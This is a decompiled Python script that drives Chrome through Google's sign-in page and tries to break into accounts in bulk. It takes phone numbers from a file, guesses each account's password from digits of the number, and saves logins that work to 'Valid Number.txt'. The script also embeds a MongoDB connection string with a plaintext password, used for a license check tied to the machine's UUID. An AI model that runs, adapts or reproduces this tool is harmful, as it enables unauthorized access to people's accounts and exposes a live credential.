# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from seleniumwire.undetected_chromedriver.v2 import Chrome, ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from pymongo import MongoClient
import time
import chromedriver_autoinstaller
import warnings
warnings.filterwarnings('ignore', category=DeprecationWarning)
import os
one_try = ''.join(list(os.popen('%SystemRoot%\\System32\\Wbem\\wmic csproduct get uuid')))
if 'UUID' in one_try:
    uuid = one_try.strip().replace('\n', '').replace('UUID', '').replace(' ', '')
else:
    print("UUID Didn't Get")
    time.sleep(8000)

def wrong_pass():
    wrong_password = "\n    __          __                      _____                                    _ \n    \\ \\        / /                     |  __ \\                                  | |\n     \\ \\  /\\  / / __ ___  _ __   __ _  | |__) |_ _ ___ _____      _____  _ __ __| |\n      \\ \\/  \\/ / '__/ _ \\| '_ \\ / _` | |  ___/ _` / __/ __\\ \\ /\\ / / _ \\| '__/ _` |\n       \\  /\\  /| | | (_) | | | | (_| | | |  | (_| \\__ \\__ \\ V  V / (_) | | | (_| |\n        \\/  \\/ |_|  \\___/|_| |_|\\__, | |_|   \\__,_|___/___/ \\_/\\_/ \\___/|_|  \\__,_|\n                                 __/ |                                             \n                                |___/                                              \n    "
    return wrong_password

def get_auth():
    username = input('Your Username: ')
    password = input('Input Your Password: ')
    cluster = 'mongodb+srv://sarwar01:grhdwZAYcmATKIZr@cluster0.rtjft.mongodb.net/codemail?retryWrites=true&w=majority'
    client = MongoClient(cluster)
    db = client.codemail2
    user_id = db.auth
    views = user_id.find()
    id_list = []
    for view in views:
        i_d = view.get('username')
        pa_ss = view.get('password')
        uuid_db = view.get('UUID')
        if i_d == username and pa_ss == password and (uuid in uuid_db):
            return True
    else:
        return False
if get_auth():
    print('Success!')
else:
    print(wrong_pass())
    print(wrong_pass())
    print(wrong_pass())
    print(wrong_pass())
    print(wrong_pass())
    print(wrong_pass())
    time.sleep(800000)
chromedriver = chromedriver_autoinstaller.install()

def driver():
    options = ChromeOptions()
    options.add_argument('--incognito')
    driver = Chrome(options=options, use_subprocess=True, executable_path=chromedriver)
    return driver
driver = driver()

def write_file(number, pass_word):
    with open('Valid Number.txt', 'a') as file:
        file.write(f'{str(number)}   {str(pass_word)}  \n')
try:
    with open('number.txt') as file:
        rows = file.readlines()
        rows = [line.replace('\n', '') for line in rows]
except FileNotFoundError:
    print('number.txt file not found on same directory')
    time.sleep(80000)

def pass_click(number):
    while True:
        try:
            WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.XPATH, '//input[@type="password"]'))).send_keys(number)
            next_p = driver.find_element_by_xpath('//*[@id="passwordNext"]/div/button').click()
            break
        except:
            pass
base_url = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn'
print('Please enter a number like: 10, 11, 12 etc.')
password_gmail = int(input('As a Password, how many numbers are required from the right side? '))
if password_gmail in [8, 9, 10, 11, 12, 13]:
    print(f'Password Combination will Generate [{password_gmail}0] number from right')
else:
    print('you have enter Wrong number ')
    time.sleep(8000)

def Bot_run(number):
    driver.get(base_url)
    email_add = driver.find_element_by_xpath('//input[@name="identifier" and @type="email"]')
    email_add.send_keys(number)
    next_e = driver.find_element_by_xpath('//div[@id="identifierNext"]')
    next_e.click()
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, '//*[contains(text(), "ইন করা যায়নি") or contains(text(), "বৈধ ইমেল") or @type="password" or contains(text(), "সাইন-আউট হয়ে") or text()="পাসওয়ার্ড দেখান" or contains(text(), "নিরাপদ নাও হতে") or contains(text(), "ওখানে কোনো সমস্যা হয়েছে।") or contains(text(), "এখনই সাইন-ইন করতে পারবেন না")]')))
    except Exception as e:
        pass
    time.sleep(2)
    if len(driver.find_elements_by_xpath('//div[text()="পাসওয়ার্ড দেখান"]')) != 0:
        pass_try = number[-password_gmail:]
        pass_click(pass_try)
        try:
            WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[contains(text(), "ভুল পাসওয়ার্ড") or contains(@src, "ctoken") or contains(text(), "অ্যাকাউন্ট")]')))
        except:
            pass
        time.sleep(1)
        if len(driver.find_elements_by_xpath('//span[contains(text(),"ভুল পাসওয়ার্ড। আবার চেষ্টা")]')) == 0 and len(driver.find_elements_by_xpath('//*[contains(@src, "ctoken")]')) == 0:
            time.sleep(0.5)
            if 'https://accounts.google.com/signin/v2/challenge/pwd' != driver.current_url.split('?')[0]:
                print(number, pass_try)
                write_file(number, pass_try)
                driver.delete_all_cookies()
    if len(driver.find_elements_by_xpath('//span[contains(text(), "ভুল পাসওয়ার্ড। আবার চেষ্টা")]')) != 0:
        try:
            element = driver.find_element_by_xpath('//span[contains(text(), "এটি রিসেট করার জন্য \'পাসওয়ার্ড ভুলে গেছি\' লিঙ্কে ক্লিক করুন।")]')
            driver.execute_script('var element = arguments[0];element.parentNode.removeChild(element);', element)
        except:
            pass
        pass_word_1st8 = pass_try[:8]
        pass_click(pass_word_1st8)
        try:
            WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[contains(text(), "ভুল পাসওয়ার্ড") or contains(@src, "ctoken") or contains(text(), "অ্যাকাউন্ট")]')))
        except:
            pass
        time.sleep(1)
        if len(driver.find_elements_by_xpath('//span[contains(text(),"ভুল পাসওয়ার্ড। আবার চেষ্টা")]')) == 0 and len(driver.find_elements_by_xpath('//*[contains(@src, "ctoken")]')) == 0:
            time.sleep(0.5)
            if 'https://accounts.google.com/signin/v2/challenge/pwd' != driver.current_url.split('?')[0]:
                print(number, pass_word_1st8)
                write_file(number, pass_word_1st8)
                driver.delete_all_cookies()
    if len(driver.find_elements_by_xpath('//span[contains(text(), "ভুল পাসওয়ার্ড। আবার চেষ্টা")]')) != 0:
        try:
            element = driver.find_element_by_xpath('//span[contains(text(), "এটি রিসেট করার জন্য \'পাসওয়ার্ড ভুলে গেছি\' লিঙ্কে ক্লিক করুন।")]')
            driver.execute_script('var element = arguments[0];element.parentNode.removeChild(element);', element)
        except:
            pass
        pass_word_last8 = number[-8:]
        pass_click(pass_word_last8)
        try:
            WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.XPATH, '//*[contains(text(), "ভুল পাসওয়ার্ড") or contains(@src, "ctoken") or contains(text(), "অ্যাকাউন্ট")]')))
        except:
            pass
        time.sleep(1)
        if len(driver.find_elements_by_xpath('//span[contains(text(),"ভুল পাসওয়ার্ড। আবার চেষ্টা")]')) == 0 and len(driver.find_elements_by_xpath('//*[contains(@src, "ctoken")]')) == 0:
            time.sleep(0.5)
            if 'https://accounts.google.com/signin/v2/challenge/pwd' != driver.current_url.split('?')[0]:
                print(number, pass_word_last8)
                write_file(number, pass_word_last8)
                driver.delete_all_cookies()
    else:
        with open('others_problem.txt', 'a') as txt_file:
            txt_file.write(number + '\n')
for number in rows:
    try:
        Bot_run(number)
    except:
        pass